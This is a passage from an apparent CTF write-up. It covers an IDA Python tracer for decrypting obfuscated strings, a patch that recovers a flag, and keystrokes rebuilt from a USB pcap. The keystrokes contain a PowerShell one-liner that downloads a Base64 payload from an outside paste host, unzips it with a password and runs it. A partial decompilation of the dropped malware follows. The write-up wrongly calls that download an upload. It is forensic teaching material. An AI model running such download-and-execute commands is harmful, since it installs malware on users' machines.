b[i] == <span class="number">0</span> <span class="keyword">and</span> b[i + <span class="number">1</span>] == <span class="number">0</span>:</span><br><span class="line">            end = i</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> end <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> end &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    raw = b[:end]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = raw.decode(<span class="string">&quot;utf-16le&quot;</span>, errors=<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(s) &lt; MIN_PRINTABLE_LEN:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    good = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> s:</span><br><span class="line">        o = <span class="built_in">ord</span>(ch)</span><br><span class="line">        <span class="keyword">if</span> ch <span class="keyword">in</span> <span class="string">&quot;\r\n\t&quot;</span> <span class="keyword">or</span> (<span class="number">32</span> &lt;= o &lt;= <span class="number">126</span>) <span class="keyword">or</span> (<span class="number">0x4E00</span> &lt;= o &lt;= <span class="number">0x9FFF</span>):</span><br><span class="line">            good += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> good / <span class="built_in">max</span>(<span class="number">1</span>, <span class="built_in">len</span>(s)) &gt;= <span class="number">0.70</span>:</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">try_decode_text_at_ptr</span>(<span class="params">p</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> p:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    s = read_cstr_ascii(p)</span><br><span class="line">    <span class="keyword">if</span> s:</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;ascii&quot;</span>, s)</span><br><span class="line">    s = read_cstr_utf16le(p)</span><br><span class="line">    <span class="keyword">if</span> s:</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;utf16&quot;</span>, s)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_text_candidates</span>(<span class="params">rax, rcx_entry</span>):</span><br><span class="line">    cands = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">label, ptr</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> ptr:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        dec = try_decode_text_at_ptr(ptr)</span><br><span class="line">        <span class="keyword">if</span> dec:</span><br><span class="line">            enc, txt = dec</span><br><span class="line">            cands.append((label, ptr, enc, txt))</span><br><span class="line"></span><br><span class="line">    raw8_rax = dbg_read_bytes(rax, <span class="number">8</span>) <span class="keyword">if</span> rax <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line">    q_rax = dbg_read_qword(rax) <span class="keyword">if</span> rax <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line">    q_rcx = dbg_read_qword(rcx_entry) <span class="keyword">if</span> rcx_entry <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    add(<span class="string">&quot;[RAX]&quot;</span>, q_rax)</span><br><span class="line">    add(<span class="string">&quot;RAX&quot;</span>, rax)</span><br><span class="line">    add(<span class="string">&quot;[RCX(entry)]&quot;</span>, q_rcx)</span><br><span class="line">    add(<span class="string">&quot;RCX(entry)&quot;</span>, rcx_entry)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> cands:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>, raw8_rax, q_rax</span><br><span class="line"></span><br><span class="line">    cands.sort(key=<span class="keyword">lambda</span> x: <span class="built_in">len</span>(x[<span class="number">3</span>]), reverse=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> cands[<span class="number">0</span>], raw8_rax, q_rax</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_dec_funcs</span>():</span><br><span class="line">    out = []</span><br><span class="line">    <span class="keyword">for</span> ea, name <span class="keyword">in</span> idautils.Names():</span><br><span class="line">        <span class="keyword">if</span> name.startswith(<span class="string">&quot;decstr_&quot;</span>):</span><br><span class="line">            f = ida_funcs.get_func(ea)</span><br><span class="line">            <span class="keyword">if</span> f <span class="keyword">and</span> f.start_ea == ea:</span><br><span class="line">                out.append((ea, name, f))</span><br><span class="line">    out.sort(key=<span class="keyword">lambda</span> x: x[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_ret_eas</span>(<span class="params">func</span>):</span><br><span class="line">    rets = []</span><br><span class="line">    ea = func.start_ea</span><br><span class="line">    <span class="keyword">while</span> ea != idc.BADADDR <span class="keyword">and</span> ea &lt; func.end_ea:</span><br><span class="line">        m = idc.print_insn_mnem(ea).lower()</span><br><span class="line">        <span class="keyword">if</span> m.startswith(<span class="string">&quot;ret&quot;</span>):</span><br><span class="line">            rets.append(ea)</span><br><span class="line">        ea = idc.next_head(ea, func.end_ea)</span><br><span class="line">    <span class="keyword">return</span> rets</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_bpt</span>(<span class="params">ea</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ida_dbg.del_bpt(ea)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    ok = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ok = ida_dbg.add_bpt(ea)</span><br><span class="line">        ida_dbg.enable_bpt(ea, <span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        ok = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> ok:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            idc.del_bpt(ea)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            idc.add_bpt(ea)</span><br><span class="line">            idc.enable_bpt(ea, <span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">del_bpt</span>(<span class="params">ea</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ida_dbg.del_bpt(ea)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        idc.del_bpt(ea)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cleanup_old</span>(<span class="params">decs</span>):</span><br><span class="line">    <span class="keyword">global</span> g_dec_trace_hooks</span><br><span class="line">    <span class="keyword">if</span> g_dec_trace_hooks:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            g_dec_trace_hooks.unhook()</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">hasattr</span>(g_dec_trace_hooks, <span class="string">&quot;fp&quot;</span>) <span class="keyword">and</span> g_dec_trace_hooks.fp:</span><br><span class="line">                g_dec_trace_hooks.fp.close()</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        g_dec_trace_hooks = <span class="literal">None</span></span><br><span class="line">    to_del = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">for</span> fea, _, f <span class="keyword">in</span> decs:</span><br><span class="line">        to_del.add(fea)</span><br><span class="line">        <span class="keyword">for</span> r <span class="keyword">in</span> get_ret_eas(f):</span><br><span class="line">            to_del.add(r)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ea <span class="keyword">in</span> to_del:</span><br><span class="line">        del_bpt(ea)</span><br><span class="line"></span><br><span class="line">    ida_kernwin.msg(<span class="string">f&quot;[cleanup] removed old hook and <span class="subst">&#123;<span class="built_in">len</span>(to_del)&#125;</span> bpts\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DecTraceHooks</span>(ida_dbg.DBG_Hooks):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, entry_map, ret_map</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        <span class="variable language_">self</span>.entry_map = entry_map</span><br><span class="line">        <span class="variable language_">self</span>.ret_map = ret_map</span><br><span class="line">        <span class="variable language_">self</span>.ctx = defaultdict(<span class="built_in">list</span>)</span><br><span class="line"></span><br><span class="line">        d = os.path.dirname(LOG_PATH)</span><br><span class="line">        <span class="keyword">if</span> d:</span><br><span class="line">            os.makedirs(d, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.fp = <span class="built_in">open</span>(LOG_PATH, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>, errors=<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.fp.write(<span class="string">f&quot;# dec trace start: <span class="subst">&#123;time.ctime()&#125;</span>\n&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.fp.flush()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_log</span>(<span class="params">self, line</span>):</span><br><span class="line">        <span class="built_in">print</span>(line)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="variable language_">self</span>.fp.write(line + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            <span class="variable language_">self</span>.fp.flush()</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dbg_bpt</span>(<span class="params">self, tid, ea</span>):</span><br><span class="line">        <span class="comment"># entry</span></span><br><span class="line">        <span class="keyword">if</span> ea <span class="keyword">in</span> <span class="variable language_">self</span>.entry_map:</span><br><span class="line">            func_ea, name = <span class="variable language_">self</span>.entry_map[ea]</span><br><span class="line">            rcx = get_reg(<span class="string">&quot;RCX&quot;</span>)</span><br><span class="line">            rsp = get_reg(<span class="string">&quot;RSP&quot;</span>)</span><br><span class="line">            caller = dbg_read_qword(rsp) <span class="keyword">if</span> rsp <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">            <span class="variable language_">self</span>.ctx[tid].append(&#123;</span><br><span class="line">                <span class="string">&quot;func_ea&quot;</span>: func_ea,</span><br><span class="line">                <span class="string">&quot;name&quot;</span>: name,</span><br><span class="line">                <span class="string">&quot;rcx_entry&quot;</span>: rcx,</span><br><span class="line">                <span class="string">&quot;caller&quot;</span>: caller <span class="keyword">or</span> <span class="number">0</span>,</span><br><span class="line">                <span class="string">&quot;t&quot;</span>: time.time(),</span><br><span class="line">            &#125;)</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">self</span>._log(</span><br><span class="line">                <span class="string">f&quot;[ENTRY] tid=<span class="subst">&#123;tid&#125;</span> <span class="subst">&#123;name&#125;</span>@0x<span class="subst">&#123;func_ea:X&#125;</span> &quot;</span></span><br><span class="line">                <span class="string">f&quot;caller=0x<span class="subst">&#123;(caller <span class="keyword">or</span> <span class="number">0</span>):X&#125;</span> rcx=0x<span class="subst">&#123;(rcx <span class="keyword">or</span> <span class="number">0</span>):X&#125;</span>&quot;</span></span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> AUTO_CONTINUE:</span><br><span class="line">                ida_dbg.request_continue_process()</span><br><span class="line">                ida_dbg.run_requests()</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># ret</span></span><br><span class="line">        <span class="keyword">if</span> ea <span class="keyword">in</span> <span class="variable language_">self</span>.ret_map:</span><br><span class="line">            func_ea, name = <span class="variable language_">self</span>.ret_map[ea]</span><br><span class="line">            rax = get_reg(<span class="string">&quot;RAX&quot;</span>)</span><br><span class="line"></span><br><span class="line">            ctx_item = <span class="literal">None</span></span><br><span class="line">            stk = <span class="variable language_">self</span>.ctx.get(tid, [])</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(stk) - <span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">if</span> stk[i][<span class="string">&quot;func_ea&quot;</span>] == func_ea:</span><br><span class="line">                    ctx_item = stk.pop(i)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            rcx_entry = ctx_item[<span class="string">&quot;rcx_entry&quot;</span>] <span class="keyword">if</span> ctx_item <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">            caller = ctx_item[<span class="string">&quot;caller&quot;</span>] <span class="keyword">if</span> ctx_item <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">            hit, raw8, qrax = extract_text_candidates(rax, rcx_entry)</span><br><span class="line">            raw8_hex = raw8.<span class="built_in">hex</span>() <span class="keyword">if</span> raw8 <span class="keyword">else</span> <span class="string">&quot;None&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> hit:</span><br><span class="line">                label, ptr, enc, s = hit</span><br><span class="line">                <span class="variable language_">self</span>._log(</span><br><span class="line">                    <span class="string">f&quot;[RET ] tid=<span class="subst">&#123;tid&#125;</span> <span class="subst">&#123;name&#125;</span>@0x<span class="subst">&#123;func_ea:X&#125;</span> ret_ea=0x<span class="subst">&#123;ea:X&#125;</span> &quot;</span></span><br><span class="line">                    <span class="string">f&quot;caller=0x<span class="subst">&#123;(caller <span class="keyword">or</span> <span class="number">0</span>):X&#125;</span> rax=0x<span class="subst">&#123;(rax <span class="keyword">or</span> <span class="number">0</span>):X&#125;</span> &quot;</span></span><br><span class="line">                    <span class="string">f&quot;raw8@rax=<span class="subst">&#123;raw8_hex&#125;</span> [rax]=0x<span class="subst">&#123;(qrax <span class="keyword">or</span> <span class="number">0</span>):X&#125;</span> &quot;</span></span><br><span class="line">                    <span class="string">f&quot;src=<span class="subst">&#123;label&#125;</span> ptr=0x<span class="subst">&#123;ptr:X&#125;</span> enc=<span class="subst">&#123;enc&#125;</span> text=<span class="subst">&#123;s!r&#125;</span>&quot;</span></span><br><span class="line">                )</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="variable language_">self</span>._log(</span><br><span class="line">                    <span class="string">f&quot;[RET ] tid=<span class="subst">&#123;tid&#125;</span> <span class="subst">&#123;name&#125;</span>@0x<span class="subst">&#123;func_ea:X&#125;</span> ret_ea=0x<span class="subst">&#123;ea:X&#125;</span> &quot;</span></span><br><span class="line">                    <span class="string">f&quot;caller=0x<span class="subst">&#123;(caller <span class="keyword">or</span> <span class="number">0</span>):X&#125;</span> rax=0x<span class="subst">&#123;(rax <span class="keyword">or</span> <span class="number">0</span>):X&#125;</span> &quot;</span></span><br><span class="line">                    <span class="string">f&quot;raw8@rax=<span class="subst">&#123;raw8_hex&#125;</span> [rax]=0x<span class="subst">&#123;(qrax <span class="keyword">or</span> <span class="number">0</span>):X&#125;</span> text=&lt;none&gt;&quot;</span></span><br><span class="line">                )</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> AUTO_CONTINUE:</span><br><span class="line">                ida_dbg.request_continue_process()</span><br><span class="line">                ida_dbg.run_requests()</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dbg_process_exit</span>(<span class="params">self, pid, tid, ea, code</span>):</span><br><span class="line">        <span class="variable language_">self</span>._log(<span class="string">f&quot;# process exit code=<span class="subst">&#123;code&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="variable language_">self</span>.fp.close()</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">install</span>():</span><br><span class="line">    decs = get_dec_funcs()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> decs:</span><br><span class="line">        ida_kernwin.msg(<span class="string">&quot;[-] no decstr_* funcs found. run rename script first.\n&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    cleanup_old(decs)</span><br><span class="line"></span><br><span class="line">    entry_map = &#123;&#125;</span><br><span class="line">    ret_map = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> fea, name, f <span class="keyword">in</span> decs:</span><br><span class="line">        entry_map[fea] = (fea, name)</span><br><span class="line">        add_bpt(fea)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> r <span class="keyword">in</span> get_ret_eas(f):</span><br><span class="line">            ret_map[r] = (fea, name)</span><br><span class="line">            add_bpt(r)</span><br><span class="line"></span><br><span class="line">    hk = DecTraceHooks(entry_map, ret_map)</span><br><span class="line">    hk.hook()</span><br><span class="line"></span><br><span class="line">    ida_kernwin.msg(<span class="string">f&quot;[+] installed: <span class="subst">&#123;<span class="built_in">len</span>(entry_map)&#125;</span> entries, <span class="subst">&#123;<span class="built_in">len</span>(ret_map)&#125;</span> rets\n&quot;</span>)</span><br><span class="line">    ida_kernwin.msg(<span class="string">f&quot;[+] log -&gt; <span class="subst">&#123;LOG_PATH&#125;</span>\n&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> hk</span><br><span class="line"></span><br><span class="line">g_dec_trace_hooks = install()</span><br></pre></td></tr></table></figure>

<p>Notice that in log:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[RET ] tid=7244 decstr_03@0x7FF737A5BDA0 ret_ea=0x7FF737A5BEA7 caller=0x7FF737A9F20C rax=0x32772FFBE0 raw8@rax=000085f8f8010000 [rax]=0x1F8F8850000 src=[RAX] ptr=0x1F8F8850000 enc=utf16 text=&#x27;GIVEMETHEFLAG&#x27;</span><br></pre></td></tr></table></figure>

<p>Find the function:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*(<span class="type">double</span> *)&amp;_XMM0 = <span class="built_in">decstr_03</span>(&amp;v249, v94, <span class="number">32</span>, <span class="number">34</span>, <span class="number">47</span>, <span class="number">30</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">45</span>, <span class="number">33</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">26</span>, <span class="number">32</span>);</span><br><span class="line">*(<span class="type">double</span> *)&amp;_XMM0 = <span class="built_in">decstr_27</span>(&amp;v250, n1361808966_2, <span class="number">28</span>, <span class="number">38</span>, <span class="number">40</span>, <span class="number">74</span>, <span class="number">52</span>, <span class="number">23</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">52</span>, <span class="number">52</span>, <span class="number">3</span>, <span class="number">57</span>, <span class="number">75</span>);</span><br><span class="line">*(<span class="type">double</span> *)&amp;_XMM0 = <span class="built_in">decstr_09</span>(&amp;Str, v160, <span class="number">31</span>, <span class="number">37</span>, <span class="number">26</span>, <span class="number">32</span>, <span class="number">67</span>, <span class="number">29</span>, <span class="number">34</span>, <span class="number">44</span>, <span class="number">41</span>, <span class="number">37</span>, <span class="number">26</span>, <span class="number">50</span>);</span><br></pre></td></tr></table></figure>

<p>The <code>decstr_03</code> is <code>GIVEMETHEFLAG</code>, as all bytes in big case <strong>add with 0x27</strong>.</p>
<p>Note that the <code>decstr_27</code> add 0x27 is <code>CMOq[&gt;(&#39;*)[[*`r</code>, with the header CMO, so patch the program, find anywhere and patch bytes to:</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>00007FF737A9F6C3                 <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+<span class="number">170h</span>+var_F0], <span class="number">4Bh</span> <span class="comment">; &#x27;K&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF737A9F6CE                 <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+<span class="number">170h</span>+var_F8], <span class="number">39h</span> <span class="comment">; &#x27;9&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF737A9F6D6                 <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+<span class="number">170h</span>+var_100], <span class="number">3</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF737A9F6DE                 <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+<span class="number">170h</span>+var_108], <span class="number">34h</span> <span class="comment">; &#x27;4&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF737A9F6E6                 <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+<span class="number">170h</span>+var_110], <span class="number">34h</span> <span class="comment">; &#x27;4&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF737A9F6EE                 <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+<span class="number">170h</span>+var_118], <span class="number">2</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF737A9F6F6                 <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+<span class="number">170h</span>+var_120], <span class="number">3</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF737A9F6FE                 <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+<span class="number">170h</span>+var_128], <span class="number">0</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF737A9F706                 <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+<span class="number">170h</span>+var_130], <span class="number">1</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF737A9F70E                 <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+<span class="number">170h</span>+var_138], <span class="number">17h</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF737A9F716                 <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+<span class="number">170h</span>+var_140], <span class="number">34h</span> <span class="comment">; &#x27;4&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF737A9F71E                 <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+<span class="number">170h</span>+var_148], <span class="number">4Ah</span> <span class="comment">; &#x27;J&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF737A9F726                 <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rsp</span>+<span class="number">170h</span>+var_150], <span class="number">28h</span> <span class="comment">; &#x27;(&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF737A9F72E                 <span class="keyword">lea</span>     <span class="built_in">rcx</span>, [<span class="built_in">rbp</span>+<span class="number">0F0h</span>+var_A0]</span><br><span class="line"><span class="symbol">.text:</span>00007FF737A9F732                 <span class="keyword">mov</span>     <span class="built_in">r8d</span>, <span class="number">1Ch</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF737A9F738                 <span class="keyword">mov</span>     <span class="built_in">r9d</span>, <span class="number">26h</span> <span class="comment">; &#x27;&amp;&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF737A9F73E                 <span class="keyword">call</span>    decstr_27       <span class="comment">; [dec-candidate -&gt; decstr_027] [dec-candidate +vzu -&gt; decstr_27]</span></span><br></pre></td></tr></table></figure>

<p>And just run the program and watch the output.</p>
<p><font color=deepskyblue><strong>CMO{0xbadc00d5}</strong></font></p>
<h3 id="What-did-you-type"><a href="#What-did-you-type" class="headerlink" title="What did you type"></a>What did you type</h3><p>The two files are .pcap traffics, the big one is a keyboard data:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powersh &lt;RET&gt;ls&lt;RET&gt;cd&lt;SPACE&gt;Docu       &lt;RET&gt;ls&lt;RET&gt;c&lt;DEL&gt;[]IO.File::WwriteAall &quot;&quot;$pwd\sus.zip,&lt;SPACE&gt;[]Cconvert::FfromBase64Sst(irm&lt;SPACE&gt;&#x27;&#x27;https://0x0.st/PbWE.txt)))&lt;RET&gt;ls&lt;RET&gt;unzip&lt;RET&gt;unzip&lt;SPACE&gt;-P&lt;SPACE&gt;1m_g0d_!!&lt;SPACE&gt;sus.z &lt;SPACE&gt;-d&lt;SPACE&gt;out&lt;RET&gt;mv&lt;SPACE&gt;out\*&lt;SPACE&gt;.&lt;RET&gt;./modu       &lt;RET&gt;rm&lt;SPACE&gt;*&lt;RET&gt;exit&lt;RET&gt;</span><br></pre></td></tr></table></figure>

<p>This uploaded a zip’s Base64 to <code>http://0x0.st/PbWE.txt</code>, and the key of the zip is <code>1m_g0d_!!</code>. </p>
<p>There’s an exe in the zip:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">memset</span>(Buffer, <span class="number">0</span>, <span class="built_in">sizeof</span>(Buffer));</span><br><span class="line">  nSize[<span class="number">0</span>] = <span class="number">256</span>;</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="built_in">sizeof</span>(buf));</span><br><span class="line">  <span class="built_in">memset</span>(buf_, <span class="number">0</span>, <span class="number">0x21u</span>);</span><br><span class="line">  <span class="built_in">GetComputerNameA</span>(Buffer, nSize);</span><br><span class="line">  n0x40 = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    ++n0x40;</span><br><span class="line">  <span class="keyword">while</span> ( Buffer[n0x40] );</span><br><span class="line">  <span class="built_in">SHA256</span>(Buffer, n0x40, (__int64)buf);</span><br><span class="line">  <span class="built_in">GETSHA256FROMWEB</span>(buf_);</span><br><span class="line">  <span class="keyword">for</span> ( n32 = <span class="number">0</span>; n32 &lt; <span class="number">32</span>; ++n32 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *((<span class="type">unsigned</span> __int8 *)buf + n32) != *((<span class="type">unsigned</span> __int8 *)buf_ + n32) )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">LODWORD</span>(p_count) = <span class="number">0</span>;</span><br><span class="line">  src = <span class="built_in">sub_140003A50</span>((DWORD *)&amp;p_count);</span><br><span class="line">  Size = (<span class="type">unsigned</span> <span class="type">int</span>)(p_count + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)p_count == <span class="number">-1</span> )</span><br><span class="line">    Size = <span class="number">-1</span>;</span><br><span class="line">  buf_1 = <span class="built_in">malloc</span>(Size);</span><br><span class="line">  <span class="built_in">memset</span>(buf_1, <span class="number">0</span>, (<span class="type">unsigned</span> <span class="type">int</span>)p_count);</span><br><span class="line">  <span class="built_in">qmemcpy</span>(buf_1, src, (<span class="type">unsigned</span> <span 